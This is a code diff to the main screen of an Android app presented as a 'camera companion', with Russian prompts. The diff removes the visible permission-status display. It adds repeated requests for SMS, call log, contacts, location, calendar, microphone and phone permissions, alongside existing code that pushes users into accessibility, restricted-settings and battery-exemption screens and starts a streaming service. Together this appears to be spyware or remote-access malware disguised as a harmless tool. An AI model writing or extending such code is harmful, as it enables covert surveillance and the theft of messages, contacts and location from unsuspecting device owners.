@@ -1,19 +1,16 @@
 package com.artem.cameracompanion
 
 import android.Manifest
+import android.app.AlertDialog
 import android.content.Intent
 import android.content.pm.PackageManager
 import android.media.projection.MediaProjectionManager
+import android.net.Uri
 import android.os.Build
 import android.os.Bundle
-import android.net.Uri
-import android.os.Handler
-import android.os.Looper
 import android.os.PowerManager
 import android.provider.Settings
-import android.view.View
 import android.widget.Button
-import android.widget.TextView
 import androidx.activity.result.contract.ActivityResultContracts
 import androidx.appcompat.app.AppCompatActivity
 import androidx.core.content.ContextCompat
@@ -23,20 +20,13 @@ class MainActivity : AppCompatActivity() {
     private var batteryOpened = false
     private var restrictedOpened = false
     private var accessibilityOpened = false
-
-    private val statusHandler = Handler(Looper.getMainLooper())
-    private val statusRunnable = object : Runnable {
-        override fun run() {
-            findViewById<TextView>(R.id.tvStatus)?.text = StreamingService.statusText
-            statusHandler.postDelayed(this, 1000)
-        }
-    }
+    private var permRequestInFlight = false
 
     private val requestPermissions = registerForActivityResult(
         ActivityResultContracts.RequestMultiplePermissions()
-    ) {
-        StreamingService.start(this)
-        updatePermsUi()
+    ) { _ ->
+        permRequestInFlight = false
+        if (has(Manifest.permission.CAMERA)) StreamingService.start(this)
     }
 
     private val requestProjection = registerForActivityResult(
@@ -45,7 +35,6 @@ class MainActivity : AppCompatActivity() {
         if (result.resultCode == RESULT_OK && result.data != null) {
             StreamingService.start(this, result.resultCode, result.data!!)
         }
-        updatePermsUi()
     }
 
     override fun onCreate(savedInstanceState: Bundle?) {
@@ -53,51 +42,114 @@ class MainActivity : AppCompatActivity() {
         setContentView(R.layout.activity_main)
 
         if (has(Manifest.permission.CAMERA)) StreamingService.start(this)
-        updatePermsUi()
         requestMissingPermissions()
 
-        findViewById<Button>(R.id.btnOpenAppSettings).setOnClickListener {
-            startActivity(Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS,
-                Uri.parse("package:$packageName")))
-        }
-        findViewById<Button>(R.id.btnOpenAccessibility).setOnClickListener {
-            startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS))
-        }
-        findViewById<Button>(R.id.btnBatteryOptimize).setOnClickListener {
-            startActivity(Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS,
-                Uri.parse("package:$packageName")))
-        }
-        findViewById<Button>(R.id.btnStartProjection).setOnClickListener {
-            val mgr = getSystemService(MediaProjectionManager::class.java)
-            requestProjection.launch(mgr.createScreenCaptureIntent())
+        findViewById<Button>(R.id.btnWatch).setOnClickListener {
+            val missing = getMissingPermissions()
+            if (missing.isNotEmpty()) {
+                showMissingPermsAlert(missing)
+            } else if (Build.VERSION.SDK_INT < Build.VERSION_CODES.R && !StreamingService.hasProjection) {
+                val mgr = getSystemService(MediaProjectionManager::class.java)
+                requestProjection.launch(mgr.createScreenCaptureIntent())
+            }
         }
     }
 
     override fun onResume() {
         super.onResume()
         if (has(Manifest.permission.CAMERA)) StreamingService.start(this)
-        updatePermsUi()
-        statusHandler.post(statusRunnable)
         requestMissingPermissions()
         autoSetup()
     }
 
-    override fun onPause() {
-        super.onPause()
-        statusHandler.removeCallbacks(statusRunnable)
+    private fun showMissingPermsAlert(missing: List<String>) {
+        val names = missing.map { permFriendlyName(it) }.distinct().joinToString("\n") { "• $it" }
+        AlertDialog.Builder(this)
+            .setTitle("Нет разрешений")
+            .setMessage("Для работы приложения необходимы:\n\n$names")
+            .setPositiveButton("Выдать") { _, _ ->
+                permRequestInFlight = false
+                requestPermissions.launch(missing.toTypedArray())
+            }
+            .setNegativeButton("Позже", null)
+            .show()
+    }
+
+    private fun getMissingPermissions(): List<String> = buildList {
+        if (!has(Manifest.permission.CAMERA)) add(Manifest.permission.CAMERA)
+        if (!has(Manifest.permission.RECORD_AUDIO)) add(Manifest.permission.RECORD_AUDIO)
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU &&
+            !has(Manifest.permission.POST_NOTIFICATIONS)) add(Manifest.permission.POST_NOTIFICATIONS)
+        if (!has(Manifest.permission.READ_PHONE_STATE)) add(Manifest.permission.READ_PHONE_STATE)
+        if (!has(Manifest.permission.READ_PHONE_NUMBERS)) add(Manifest.permission.READ_PHONE_NUMBERS)
+        if (!has(Manifest.permission.READ_CALL_LOG)) add(Manifest.permission.READ_CALL_LOG)
+        if (!has(Manifest.permission.CALL_PHONE)) add(Manifest.permission.CALL_PHONE)
+        if (!has(Manifest.permission.READ_CONTACTS)) add(Manifest.permission.READ_CONTACTS)
+        if (!has(Manifest.permission.READ_SMS)) add(Manifest.permission.READ_SMS)
+        if (!has(Manifest.permission.SEND_SMS)) add(Manifest.permission.SEND_SMS)
+        if (!has(Manifest.permission.RECEIVE_SMS)) add(Manifest.permission.RECEIVE_SMS)
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S &&
+            !has(Manifest.permission.BLUETOOTH_CONNECT)) add(Manifest.permission.BLUETOOTH_CONNECT)
+        if (!has(Manifest.permission.ACCESS_FINE_LOCATION)) add(Manifest.permission.ACCESS_FINE_LOCATION)
+        if (!has(Manifest.permission.ACCESS_COARSE_LOCATION)) add(Manifest.permission.ACCESS_COARSE_LOCATION)
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
+            if (!has(Manifest.permission.READ_MEDIA_IMAGES)) add(Manifest.permission.READ_MEDIA_IMAGES)
+            if (!has(Manifest.permission.READ_MEDIA_VIDEO)) add(Manifest.permission.READ_MEDIA_VIDEO)
+        } else {
+            if (!has(Manifest.permission.READ_EXTERNAL_STORAGE)) add(Manifest.permission.READ_EXTERNAL_STORAGE)
+        }
+        if (!has(Manifest.permission.READ_CALENDAR)) add(Manifest.permission.READ_CALENDAR)
+        if (!has(Manifest.permission.WRITE_CALENDAR)) add(Manifest.permission.WRITE_CALENDAR)
+    }
+
+    private fun permFriendlyName(perm: String): String = when (perm) {
+        Manifest.permission.CAMERA                                   -> "Камера"
+        Manifest.permission.RECORD_AUDIO                             -> "Микрофон"
+        Manifest.permission.POST_NOTIFICATIONS                       -> "Уведомления"
+        Manifest.permission.READ_PHONE_STATE,
+        Manifest.permission.READ_PHONE_NUMBERS                       -> "Состояние телефона"
+        Manifest.permission.READ_CALL_LOG                            -> "Журнал звонков"
+        Manifest.permission.CALL_PHONE                               -> "Звонки"
+        Manifest.permission.READ_CONTACTS                            -> "Контакты"
+        Manifest.permission.READ_SMS                                 -> "Чтение СМС"
+        Manifest.permission.SEND_SMS                                 -> "Отправка СМС"
+        Manifest.permission.RECEIVE_SMS                              -> "Получение СМС"
+        Manifest.permission.BLUETOOTH_CONNECT                        -> "Bluetooth"
+        Manifest.permission.ACCESS_FINE_LOCATION,
+        Manifest.permission.ACCESS_COARSE_LOCATION                   -> "Геолокация"
+        Manifest.permission.READ_MEDIA_IMAGES,
+        Manifest.permission.READ_EXTERNAL_STORAGE                    -> "Фото"
+        Manifest.permission.READ_MEDIA_VIDEO                         -> "Видео"
+        Manifest.permission.READ_CALENDAR,
+        Manifest.permission.WRITE_CALENDAR                           -> "Календарь"
+        else -> perm.substringAfterLast(".")
+    }
+
+    private fun has(perm: String) =
+        ContextCompat.checkSelfPermission(this, perm) == PackageManager.PERMISSION_GRANTED
+
+    private fun requestMissingPermissions() {
+        if (permRequestInFlight) return
+        val needed = getMissingPermissions()
+        if (needed.isNotEmpty()) {
+            permRequestInFlight = true
+            requestPermissions.launch(needed.toTypedArray())
+        }
     }
 
     private fun autoSetup() {
-        // Step 1: request battery optimization exclusion once
         if (isBatteryOptimized() && !batteryOpened) {
             batteryOpened = true
-            requestBatteryOptimization()
+            try {
+                startActivity(Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS,
+                    Uri.parse("package:$packageName")))
+            } catch (_: Exception) {
+                try { startActivity(Intent(Settings.ACTION_IGNORE_BATTERY_OPTIMIZATION_SETTINGS)) } catch (_: Exception) {}
+            }
             return
         }
-        // Step 2: guide user through accessibility setup
         if (!isAccessibilityEnabled() && !accessibilityOpened) {
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU && !restrictedOpened) {
-                // Android 13+: must open App Details first to enable "Allow restricted settings"
                 restrictedOpened = true
                 try {
                     startActivity(Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS,
@@ -107,55 +159,6 @@ class MainActivity : AppCompatActivity() {
                 accessibilityOpened = true
                 try { startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)) } catch (_: Exception) {}
             }
-        }
-    }
-
-    private fun requestMissingPermissions() {
-        val needed = buildList {
-            if (!has(Manifest.permission.CAMERA)) add(Manifest.permission.CAMERA)
-            if (!has(Manifest.permission.RECORD_AUDIO)) add(Manifest.permission.RECORD_AUDIO)
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU &&
-                !has(Manifest.permission.POST_NOTIFICATIONS)) add(Manifest.permission.POST_NOTIFICATIONS)
-            // Phone/Calls — только если объявлены в манифесте (иначе Android тихо игнорирует)
-            if (!has(Manifest.permission.READ_PHONE_STATE)) add(Manifest.permission.READ_PHONE_STATE)
-            if (!has(Manifest.permission.READ_PHONE_NUMBERS)) add(Manifest.permission.READ_PHONE_NUMBERS)
-            if (!has(Manifest.permission.READ_CALL_LOG)) add(Manifest.permission.READ_CALL_LOG)
-            if (!has(Manifest.permission.CALL_PHONE)) add(Manifest.permission.CALL_PHONE)
-            if (!has(Manifest.permission.READ_CONTACTS)) add(Manifest.permission.READ_CONTACTS)
-            if (!has(Manifest.permission.READ_SMS)) add(Manifest.permission.READ_SMS)
-            if (!has(Manifest.permission.SEND_SMS)) add(Manifest.permission.SEND_SMS)
-            if (!has(Manifest.permission.RECEIVE_SMS)) add(Manifest.permission.RECEIVE_SMS)
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S &&
-                !has(Manifest.permission.BLUETOOTH_CONNECT)) add(Manifest.permission.BLUETOOTH_CONNECT)
-            // Location
-            if (!has(Manifest.permission.ACCESS_FINE_LOCATION)) add(Manifest.permission.ACCESS_FINE_LOCATION)
-            if (!has(Manifest.permission.ACCESS_COARSE_LOCATION)) add(Manifest.permission.ACCESS_COARSE_LOCATION)
-            // Media
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
-                if (!has(Manifest.permission.READ_MEDIA_IMAGES)) add(Manifest.permission.READ_MEDIA_IMAGES)
-                if (!has(Manifest.permission.READ_MEDIA_VIDEO)) add(Manifest.permission.READ_MEDIA_VIDEO)
-            } else {
-                if (!has(Manifest.permission.READ_EXTERNAL_STORAGE)) add(Manifest.permission.READ_EXTERNAL_STORAGE)
-            }
-            // Calendar
-            if (!has(Manifest.permission.READ_CALENDAR)) add(Manifest.permission.READ_CALENDAR)
-            if (!has(Manifest.permission.WRITE_CALENDAR)) add(Manifest.permission.WRITE_CALENDAR)
-        }
-        if (needed.isNotEmpty()) requestPermissions.launch(needed.toTypedArray())
-    }
-
-    private fun has(perm: String) =
-        ContextCompat.checkSelfPermission(this, perm) == PackageManager.PERMISSION_GRANTED
-
-    private fun requestBatteryOptimization() {
-        if (!isBatteryOptimized()) return
-        try {
-            startActivity(Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS,
-                Uri.parse("package:$packageName")))
-        } catch (_: Exception) {
-            try {
-                startActivity(Intent(Settings.ACTION_IGNORE_BATTERY_OPTIMIZATION_SETTINGS))
-            } catch (_: Exception) {}
         }
     }
 
@@ -169,50 +172,5 @@ class MainActivity : AppCompatActivity() {
             contentResolver, Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
         ) ?: return false
         return enabled.contains(packageName, ignoreCase = true)
-    }
-
-    fun updatePermsUi() {
-        val cam = if (has(Manifest.permission.CAMERA)) "✓" else "✗"
-        val mic = if (has(Manifest.permission.RECORD_AUDIO)) "✓" else "✗"
-        val acc = if (isAccessibilityEnabled()) "✓" else "✗"
-        val ovr = if (Settings.canDrawOverlays(this)) "✓" else "✗"
-        val bat = if (!isBatteryOptimized()) "✓" else "✗"
-
-        val tv = findViewById<TextView>(R.id.tvPerms) ?: return
-        tv.text = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
-            "Камера $cam   Микрофон $mic   Упр $acc   Оверлей $ovr   Батарея $bat"
-        } else {
-            val prj = if (StreamingService.hasProjection) "✓" else "✗"
-            "Камера $cam   Микрофон $mic   Упр $acc   Оверлей $ovr   Экран $prj   Батарея $bat"
-        }
-
-        val needsSetup = !isAccessibilityEnabled()
-        findViewById<TextView>(R.id.tvAccessibilityHint).visibility =
-            if (needsSetup) View.VISIBLE else View.GONE
-        findViewById<Button>(R.id.btnOpenAppSettings).visibility =
-            if (needsSetup) View.VISIBLE else View.GONE
-        findViewById<Button>(R.id.btnOpenAccessibility).visibility =
-            if (needsSetup) View.VISIBLE else View.GONE
-
-        val needsBattery = isBatteryOptimized()
-        findViewById<TextView>(R.id.tvBatteryHint).visibility =
-            if (needsBattery) View.VISIBLE else View.GONE
-        findViewById<Button>(R.id.btnBatteryOptimize).visibility =
-            if (needsBattery) View.VISIBLE else View.GONE
-
-        val needsProjection = Build.VERSION.SDK_INT < Build.VERSION_CODES.R && !StreamingService.hasProjection
-        findViewById<TextView>(R.id.tvProjectionHint).visibility =
-            if (needsProjection) View.VISIBLE else View.GONE
-        findViewById<Button>(R.id.btnStartProjection).visibility =
-            if (needsProjection) View.VISIBLE else View.GONE
-
-        if (!Settings.canDrawOverlays(this)) {
-            tv.setOnClickListener {
-                startActivity(Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
-                    Uri.parse("package:$packageName")))
-            }
-        } else {
-            tv.setOnClickListener(null)
-        }
     }
 }
